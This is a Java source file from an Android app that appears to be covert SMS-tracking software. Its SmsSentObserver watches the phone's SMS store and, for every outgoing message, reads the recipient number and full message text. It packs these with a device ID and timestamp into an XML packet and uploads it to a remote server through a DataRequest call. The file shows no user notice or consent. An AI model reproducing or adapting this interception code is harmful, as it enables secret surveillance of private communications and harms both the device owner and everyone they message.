package com.inet.android.sms;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class SmsSentObserver extends ContentObserver {

	private static final String TAG = "SMSTRACKERopa";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	String dir = null;
	SharedPreferences sp;
	private Context mContext;
	RequestMakerImpl req;
	private static long id = 0;
	

	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		dir = "исх. Sms";
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		String sms = sp.getString("KBD", "0");

		if (sms.equals("0")) {
			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
			return;
		}

		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork), 
					"isWork return " + Boolean.toString(isWork));

			return;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
		}

		try {
			Logging.doLog(TAG, "Notification on SMS observer", "Notification on SMS observer");

			Cursor sms_sent_cursor = mContext.getContentResolver().query(
					STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));

					Logging.doLog(TAG, "protocol : " + protocol, "protocol : " + protocol);

					if (protocol == null) {
						// String[] colNames = sms_sent_cursor.getColumnNames();
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));

						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : " + type);

						if (type == 2) {
							long messageId = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("_id"));
							// проверяем не обрабатывали ли мы это сообщение
							// только-что
							if (messageId != id) {
								id = messageId;
								int threadId = sms_sent_cursor
										.getInt(sms_sent_cursor
												.getColumnIndex("thread_id"));
								Cursor c = mContext.getContentResolver().query(
										Uri.parse("content://sms/outbox/"
												+ threadId), null, null, null,
										null);
								c.moveToNext();
								String sendStr = "<packet><id>"
										+ sp.getString("ID", "ID")
										+ "</id><time>"
										+ logTime()
										+ "</time><type>4</type><app>"
										+ dir
										+ "</app><ttl>"
										+ sms_sent_cursor
												.getString(sms_sent_cursor
														.getColumnIndex("address"))
										+ "</ttl><cdata1>"
										+ sms_sent_cursor
												.getString(sms_sent_cursor
														.getColumnIndex("body"))
										+ "</cdata1><ntime>" + "30"
										+ "</ntime></packetSentObserver>";

//								req = new RequestMakerImpl(mContext);
//								req.sendDataRequest(sendStr);
								
								DataRequest dr = new DataRequest(mContext);
								dr.sendRequest(sendStr);

								Logging.doLog(TAG, sendStr, sendStr);

								/*
								 * if(colNames != null){ for(int k=0;
								 * k<colNames.length; k++){ Log.e(TAG,
								 * "colNames["+k+"] : " + colNames[k]); } }
								 */
								sms_sent_cursor.close();
							}
						}
					}
				}
			} else

				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty", 
					"smsSentObserver: Send Cursor is Empty");
		} catch (Exception sggh) {
			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(), 
					"Error on onChange : " + sggh.toString());
		}
		super.onChange(selfChange);
	}// fn onChange

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}// End of class SmsSentObserver
